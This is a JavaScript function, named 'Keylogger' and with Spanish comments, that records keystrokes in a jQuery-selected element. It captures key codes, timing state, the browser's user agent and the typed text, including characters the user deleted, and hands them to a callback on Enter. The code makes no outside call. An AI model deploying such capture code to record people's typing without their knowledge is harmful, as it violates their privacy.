window['Keylogger']=function($selector,on_end_callback) {
	
	console.log($selector);
	console.log($selector.created);
	$selector.created = true;
	console.log("cargando Keylogger");
	var
		n=navigator['userAgent'],
		last,
		keystroke,
		bufferstroke,textstroke,delstroke,
		add=function(v) {keystroke+=v;},
		radd=function(v){add(radix2(v))},
		init=function() {
			keystroke=bufferstroke=delstroke=textstroke='';
			last=0;
			add(radix2(n.length)+n);
		}
	init();

	$selector['on']('keydown keyup',function(e){

		radd(e['originalEvent']['location']<<9|e['keyCode']<<1|(e['type']=='keyup'?0:1))
		last=e['timeStamp'];
	});
	$selector['on']('keypress keyup',function(e){
		// Al presionar Enter se llama la función definida al crear el keylogger 
		if (e.which==13){
			on_end_callback(bufferstroke+textstroke,keystroke);
			init();
		}
	});

	$selector['on']('keypress',function(e){
		var eventChar = String.fromCharCode(e.which || e.keyCode || e.charCode);

		if (e['keyCode']==8) {
			if (textstroke) {
				delstroke=textstroke.slice(-1)+delstroke;
				textstroke=textstroke.slice(0,-1);
			}
		} else if ( eventChar.length==1){
			if (delstroke) {
				bufferstroke+=textstroke+'<s>'+delstroke+'</s>';
				delstroke=textstroke='';
			}
			textstroke+=eventChar;
		} else {
			textstroke+=' ';
		}
	});

	function logChat(arraySelected){

	}

	function radix2(number) {
		var
			out='';
		/** @const */ var
			encode1="0124689qwertyuiopsdfgASDFGHJKLZX",
			encode2="35 ahjklzxcvbnmQWERTYUIOPCVBNM7#";
		while (number>31) {
			out+=encode1.charAt(number & 31);
			number=number>>5;
		}
		return out+encode2.charAt(number);
	}

	return function() {
		on_end_callback(bufferstroke+textstroke,keystroke);
		init();
		console.log("keyloguer flush...")
	}
}
